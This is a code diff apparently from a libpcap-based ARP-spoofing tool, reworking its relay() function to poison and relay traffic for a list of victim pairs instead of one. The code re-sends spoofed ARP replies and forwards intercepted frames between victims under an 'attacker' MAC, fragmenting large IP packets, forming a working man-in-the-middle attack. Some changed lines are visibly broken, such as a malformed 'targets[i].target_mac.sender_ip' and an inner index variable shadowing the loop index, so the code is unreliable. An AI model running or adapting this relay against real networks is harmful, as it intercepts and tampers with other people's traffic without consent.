@@ -88,7 +88,8 @@ int reply(const char *dev, pcap_t *pcap, u_int8_t *mac, u_int8_t *ip)
     return 0;
 }
 
-int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *sender_mac, u_int8_t *target_mac, u_int8_t *sender_ip, u_int8_t *target_ip)
+// int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *sender_mac, u_int8_t *target_mac, u_int8_t *sender_ip, u_int8_t *target_ip)
+int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, list *targets, int count)
 {
     const int fragment_size = 1440;
     while (true)
@@ -113,103 +114,107 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *sende
             break;
         }
 
-        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, target_mac)) && (if_same_ip(pkt->arp_.tip, sender_ip)))
+        for (int i = 0; i < count; i++)
         {
-            printf("where is sender?\n");
-            request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, 1);
-            continue;
-        }
 
-        if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, sender_mac)) && (if_same_ip(pkt->arp_.tip, target_ip)))
-        {
-            printf("where is target?\n");
-            request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, 1);
-            continue;
-        }
-
-        if (if_same_mac(pkt->eth_.smac_, sender_mac))
-        {
-            if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
+            if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, targets[i].target_mac)) && (if_same_ip(pkt->arp_.tip, targets[i].target_mac.sender_ip)))
             {
-                // memcpy(pkt->eth_.dmac_, target_mac, 6);
-                // memcpy(pkt->eth_.smac_, attacker_mac, 6);
-                copy_mac(target_mac, pkt->eth_.dmac_);
-                copy_mac(attacker_mac, pkt->eth_.smac_);
+                printf("where is sender?\n");
+                request(dev, pcap, targets[i].target_mac, attacker_mac, attacker_mac, targets[i].sender_ip, targets[i].target_mac, targets[i].target_ip, 1);
+                continue;
+            }
 
-                int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
-                if (res != 0)
+            if ((pkt->eth_.type_ == htons(EthHdr::Arp)) && (pkt->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(pkt->arp_.smac_, targets[i].sender_mac)) && (if_same_ip(pkt->arp_.tip, targets[i].target_ip)))
+            {
+                printf("where is target?\n");
+                request(dev, pcap, targets[i].sender_mac, attacker_mac, attacker_mac, targets[i].target_ip, targets[i].sender_mac, targets[i].sender_ip, 1);
+                continue;
+            }
+
+            if (if_same_mac(pkt->eth_.smac_, targets[i].sender_mac))
+            {
+                if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
                 {
-                    printf("pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-                    return -1;
+                    // memcpy(pkt->eth_.dmac_, target_mac, 6);
+                    // memcpy(pkt->eth_.smac_, attacker_mac, 6);
+                    copy_mac(targets[i].target_mac, pkt->eth_.dmac_);
+                    copy_mac(attacker_mac, pkt->eth_.smac_);
+
+                    int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
+                    if (res != 0)
+                    {
+                        printf("pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+                        return -1;
+                    }
                 }
             }
-        }
-        else if (if_same_mac(pkt->eth_.smac_, target_mac))
-        {
-            if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
+            else if (if_same_mac(pkt->eth_.smac_, targets[i].target_mac))
             {
-                copy_mac(sender_mac, pkt->eth_.dmac_);
-                copy_mac(attacker_mac, pkt->eth_.smac_);
-
-                int i = 0;
-                int flag = 0;
-                sendsize = header->len;
-                memcpy(data, packet + 34, sendsize - 34);
-                //단위 400 434 int i = 0;
-                while (sendsize > fragment_size + 34)
+                if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
                 {
-                    flag = 1;
-                    for (int j = 0; j < fragment_size; j++)
+                    copy_mac(targets[i].sender_mac, pkt->eth_.dmac_);
+                    copy_mac(attacker_mac, pkt->eth_.smac_);
+
+                    int i = 0;
+                    int flag = 0;
+                    sendsize = header->len;
+                    memcpy(data, packet + 34, sendsize - 34);
+                    //단위 400 434 int i = 0;
+                    while (sendsize > fragment_size + 34)
                     {
-                        *((u_char *)pkt + 34 + j) = *(packet + 34 + fragment_size * i + j);
+                        flag = 1;
+                        for (int j = 0; j < fragment_size; j++)
+                        {
+                            *((u_char *)pkt + 34 + j) = *(packet + 34 + fragment_size * i + j);
+                        }
+                        ip_pkt->ip_.ip_len = htons(fragment_size + 20);
+                        ip_pkt->ip_.ip_offset = htons((fragment_size / 8 * i) | 0b0010000000000000);
+                        ip_pkt->ip_.ip_check = htons(calc_checksum_ip(&(ip_pkt->ip_)));
+                        printf("sendsize : %d\n", sendsize);
+                        int res = pcap_sendpacket(pcap, (u_char *)pkt, fragment_size + 34);
+                        if (res != 0)
+                        {
+                            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+                            return -1;
+                        }
+                        sendsize -= fragment_size;
+                        i++;
                     }
-                    ip_pkt->ip_.ip_len = htons(fragment_size + 20);
-                    ip_pkt->ip_.ip_offset = htons((fragment_size / 8 * i) | 0b0010000000000000);
-                    ip_pkt->ip_.ip_check = htons(calc_checksum_ip(&(ip_pkt->ip_)));
-                    printf("sendsize : %d\n", sendsize);
-                    int res = pcap_sendpacket(pcap, (u_char *)pkt, fragment_size + 34);
+
+                    if (flag == 1)
+                    {
+                        for (int j = 0; j < sendsize - 34; j++)
+                        {
+                            *((u_char *)pkt + 34 + j) = *(packet + 34 + fragment_size * i + j);
+                        }
+                        // memcpy(pkt + 34, data + (400 * i), 400);
+                        sendsize = header->len - fragment_size * i;
+                        ip_pkt->ip_.ip_len = htons(sendsize - 14);
+                        ip_pkt->ip_.ip_offset = htons((fragment_size / 8 * i) | 0b0000000000000000);
+                        memcpy(pkt + 34, data + fragment_size * i, sendsize);
+                        ip_pkt->ip_.ip_check = htons(calc_checksum_ip(&(ip_pkt->ip_)));
+                        printf("sendsize : %d\n", sendsize);
+                        int res = pcap_sendpacket(pcap, (u_char *)pkt, sendsize);
+                        // int res = pcap_sendpacket(pcap, (u_char *)pkt, sendsize);
+                        if (res != 0)
+                        {
+                            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+                            return -1;
+                        }
+                        continue;
+                    }
+
+                    int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
                     if (res != 0)
                     {
                         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                         return -1;
                     }
-                    sendsize -= fragment_size;
-                    i++;
+                    // ip_pkt->ip_.ip_len = htons(sendsize - 14);
+                    // ip_pkt->ip_.ip_offset = 0;
+                    //  memcpy(pkt->eth_.dmac_, sender_mac, 6);
+                    //  memcpy(pkt->eth_.smac_, attacker_mac, 6);
                 }
-
-                if (flag == 1)
-                {
-                    for (int j = 0; j < sendsize - 34; j++)
-                    {
-                        *((u_char *)pkt + 34 + j) = *(packet + 34 + fragment_size * i + j);
-                    }
-                    // memcpy(pkt + 34, data + (400 * i), 400);
-                    sendsize = header->len - fragment_size * i;
-                    ip_pkt->ip_.ip_len = htons(sendsize - 14);
-                    ip_pkt->ip_.ip_offset = htons((fragment_size / 8 * i) | 0b0000000000000000);
-                    memcpy(pkt + 34, data + fragment_size * i, sendsize);
-                    ip_pkt->ip_.ip_check = htons(calc_checksum_ip(&(ip_pkt->ip_)));
-                    printf("sendsize : %d\n", sendsize);
-                    int res = pcap_sendpacket(pcap, (u_char *)pkt, sendsize);
-                    // int res = pcap_sendpacket(pcap, (u_char *)pkt, sendsize);
-                    if (res != 0)
-                    {
-                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-                        return -1;
-                    }
-                    continue;
-                }
-
-                int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
-                if (res != 0)
-                {
-                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-                    return -1;
-                }
-                // ip_pkt->ip_.ip_len = htons(sendsize - 14);
-                // ip_pkt->ip_.ip_offset = 0;
-                //  memcpy(pkt->eth_.dmac_, sender_mac, 6);
-                //  memcpy(pkt->eth_.smac_, attacker_mac, 6);
             }
         }
     }
